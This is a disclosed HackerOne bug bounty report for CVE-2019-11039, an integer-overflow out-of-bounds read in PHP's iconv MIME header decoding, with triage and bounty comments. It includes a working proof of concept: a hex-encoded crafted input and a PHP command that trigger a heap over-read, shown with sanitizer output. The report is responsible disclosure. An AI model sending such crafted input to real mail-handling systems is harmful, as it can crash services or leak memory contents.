{"id":593229,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81OTMyMjk=","url":"https://hackerone.com/reports/593229","title":"Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-05-31T09:58:15.693Z","submitted_at":"2019-05-31T09:58:15.693Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"neural_x","url":"/neural_x","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-11039"],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-12T10:51:39.074Z","bug_reporter_agreed_on_going_public_at":"2020-10-12T10:51:39.014Z","team_member_agreed_on_going_public_at":"2020-10-10T01:48:28.099Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PHP upstream bug report: https://bugs.php.net/bug.php?id=78069\n\n*Description:*\nIn _php_iconv_mime_decode() function in iconv.c, there's an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:\n```\nfor (str_left = str_nbytes; str_left \u003e 0; str_left--, p1++) {\n```\nInside this for loop, it's possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two '?' characters while increasing p1 and decreasing str_left:\n```\nint qmarks = 2;\nwhile (qmarks \u003e 0 \u0026\u0026 str_left \u003e 1) {\n    if (*(++p1) == '?') {\n        --qmarks;\n    }\n    --str_left;\n}\n```\nIf the while condition is stopped, it will proceed to the next condition that checks if the next character is '=' and if it is, p1 is increased again and str_left is decreased: \n```\nif (*(p1 + 1) == '=') {\n    ++p1;\n    --str_left;\n}\n```\nHowever, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to 'pretval' variable and if it doesn't error out, it will properly set scan_stat and break:\n```\nscan_stat = 12;\nbreak;\n```\nThe for loop is being run from start again, but before checking the condition 'str_left \u003e 0', it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to 'pretval'.\n\n*PoC:*\n```\n$ echo \"53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2\" | xxd -r -p - \u003e poc\n\n$ sha256sum poc\nc471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc\n\n$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents(\"poc\"),2);'\n=================================================================\n==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460\nREAD of size 1 at 0x60d0000005a8 thread T0\n    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965\n    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409\n    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690\n...\n```\nThis issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.\n\n## Impact\n\nRemote attacker can submit specially crafted MIME format message (email) which triggers the vulnerability in the parsing code when decoding MIME headers. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string. The exact behaviour depends on the content of the memory after 'str' buffer.","vulnerability_information_html":"\u003cp\u003ePHP upstream bug report: \u003ca title=\"https://bugs.php.net/bug.php?id=78069\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D78069\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=78069\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eDescription:\u003c/em\u003e\u003cbr\u003e\nIn _php_iconv_mime_decode() function in iconv.c, there\u0026#39;s an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efor (str_left = str_nbytes; str_left \u0026gt; 0; str_left--, p1++) {\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eInside this for loop, it\u0026#39;s possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two \u0026#39;?\u0026#39; characters while increasing p1 and decreasing str_left:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eint qmarks = 2;\nwhile (qmarks \u0026gt; 0 \u0026amp;\u0026amp; str_left \u0026gt; 1) {\n    if (*(++p1) == \u0026#39;?\u0026#39;) {\n        --qmarks;\n    }\n    --str_left;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the while condition is stopped, it will proceed to the next condition that checks if the next character is \u0026#39;=\u0026#39; and if it is, p1 is increased again and str_left is decreased: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif (*(p1 + 1) == \u0026#39;=\u0026#39;) {\n    ++p1;\n    --str_left;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to \u0026#39;pretval\u0026#39; variable and if it doesn\u0026#39;t error out, it will properly set scan_stat and break:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003escan_stat = 12;\nbreak;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe for loop is being run from start again, but before checking the condition \u0026#39;str_left \u0026gt; 0\u0026#39;, it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to \u0026#39;pretval\u0026#39;.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003ePoC:\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo \u0026quot;53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2\u0026quot; | xxd -r -p - \u0026gt; poc\n\n$ sha256sum poc\nc471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc\n\n$ USE_ZEND_ALLOC=0 sapi/cli/php -r \u0026#39;$hdr = iconv_mime_decode_headers(file_get_contents(\u0026quot;poc\u0026quot;),2);\u0026#39;\n=================================================================\n==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460\nREAD of size 1 at 0x60d0000005a8 thread T0\n    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965\n    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409\n    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRemote attacker can submit specially crafted MIME format message (email) which triggers the vulnerability in the parsing code when decoding MIME headers. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string. The exact behaviour depends on the content of the memory after \u0026#39;str\u0026#39; buffer.\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":9,"name":"Buffer Over-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-09T01:48:28.211Z","allow_singular_disclosure_after":-4336833.69889647,"singular_disclosure_allowed":true,"vote_count":58,"voters":["pat_ventuzelo","secator","an0nym0us","1337ibrahim","khizer47","kassem_s94","agmed0","rrreeeddd","surya_1029","melto","and 48 more..."],"severity":{"rating":"high","score":8.2,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4962186,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @neural_x - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/neural_x\"\u003e@neural_x\u003c/a\u003e - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-31T16:43:34.808Z","updated_at":"2019-05-31T16:43:34.808Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4962642,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-31T18:20:04.919Z","updated_at":"2019-05-31T18:20:04.919Z","cve_ids":["CVE-2019-11039"],"actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4962645,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you @neural_x! I was able to validate your report, and have submitted it to the appropriate remediation team for review. Please note that the status and severity are subject to change. ","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/neural_x\"\u003e@neural_x\u003c/a\u003e! I was able to validate your report, and have submitted it to the appropriate remediation team for review. Please note that the status and severity are subject to change. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-31T18:20:15.002Z","updated_at":"2019-05-31T18:20:15.002Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7308790,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, when can I expect any update regarding this report? It's been open for quite a while with no further response. Thanks!","markdown_message":"\u003cp\u003eHello, when can I expect any update regarding this report? It\u0026#39;s been open for quite a while with no further response. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-13T10:45:58.745Z","updated_at":"2020-03-13T10:45:58.745Z","actor":{"username":"neural_x","cleared":false,"url":"/neural_x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7309929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @neural_x - This program is volunteer-run and, unfortunately, I do not have any updates for you at this time, but you will be updated as soon as there is additional information to share. Thanks for your patience! ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/neural_x\"\u003e@neural_x\u003c/a\u003e - This program is volunteer-run and, unfortunately, I do not have any updates for you at this time, but you will be updated as soon as there is additional information to share. Thanks for your patience! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-13T13:11:08.409Z","updated_at":"2020-03-13T13:11:08.409Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9478476,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T00:36:02.469Z","updated_at":"2020-10-10T00:36:02.469Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"neural_x","url":"/neural_x"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9478477,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @neural_x,\n\nOn behalf of the Internet Bug Bounty Panel, thank you for your continued patience on this report. The IBB requires that all in-scope open source projects be mutually engaged with us to ensure there is a good experience for all. Unfortunately, we have not been able to maintain that relationship with the upstream PHP community, and as a result, HackerOne and the IBB Panel have collectively agreed to shut down the program indefinitely.\n\nIn an effort to reward researchers for their hard work and patience thus far, the IBB panel has elected to pay bounties to all valid reports without PHP’s input. Bounty amounts are decided on based on the PHP policy and severity assigned on the accompanying CVE. \n\nAs an act of good faith, we will also close this report as Resolved.\n\nThank you for helping keep the internet safe and secure!\n-The Internet Bug Bounty Panel \n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/neural_x\"\u003e@neural_x\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eOn behalf of the Internet Bug Bounty Panel, thank you for your continued patience on this report. The IBB requires that all in-scope open source projects be mutually engaged with us to ensure there is a good experience for all. Unfortunately, we have not been able to maintain that relationship with the upstream PHP community, and as a result, HackerOne and the IBB Panel have collectively agreed to shut down the program indefinitely.\u003c/p\u003e\n\n\u003cp\u003eIn an effort to reward researchers for their hard work and patience thus far, the IBB panel has elected to pay bounties to all valid reports without PHP’s input. Bounty amounts are decided on based on the PHP policy and severity assigned on the accompanying CVE. \u003c/p\u003e\n\n\u003cp\u003eAs an act of good faith, we will also close this report as Resolved.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep the internet safe and secure!\u003cbr\u003e\n-The Internet Bug Bounty Panel \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-10T00:36:17.099Z","updated_at":"2020-10-10T00:36:17.099Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"neural_x","url":"/neural_x"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9478696,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T01:48:28.123Z","updated_at":"2020-10-10T01:48:28.123Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9492860,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for bounty!","markdown_message":"\u003cp\u003eThanks for bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-12T10:51:39.029Z","updated_at":"2020-10-12T10:51:39.029Z","actor":{"username":"neural_x","cleared":false,"url":"/neural_x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9492861,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-12T10:51:39.092Z","updated_at":"2020-10-12T10:51:39.092Z","actor":{"username":"neural_x","cleared":false,"url":"/neural_x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}